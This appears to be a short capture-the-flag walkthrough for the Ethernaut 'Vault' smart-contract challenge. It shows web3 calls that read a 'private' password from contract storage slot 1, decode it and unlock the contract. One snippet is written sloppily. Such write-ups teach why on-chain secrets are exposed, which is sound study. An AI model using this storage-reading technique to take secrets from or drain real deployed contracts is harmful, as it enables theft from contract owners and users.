# Vault

Everything on blockchain is not confidential even you mark the variable as private.It only private for not allow to access by other contract. <br/>
Everything on blockchain store as binary.You can query data from blockchain by:
```javascript
web3.eth.getStorageAt(contractAddress, slotNumber, function(error, result){});
```

In the Vault contract, owner set password in during deploy contract in the constructor.So, we want to get value on the slot 1 because password store in slot 1.
```javascript
web3.eth.getStorageAt(contractAddress, 1, function(error, result){result=pwd});
```
Convert binary to ascii that you can read easy by:
```javascript
web3.utils.toAscii(pwd)
```

Unlock vault:
```javascript
await contract.unlock(pwd)
```

Check the lock status again:
```javascript
await contract.locked();
> false
```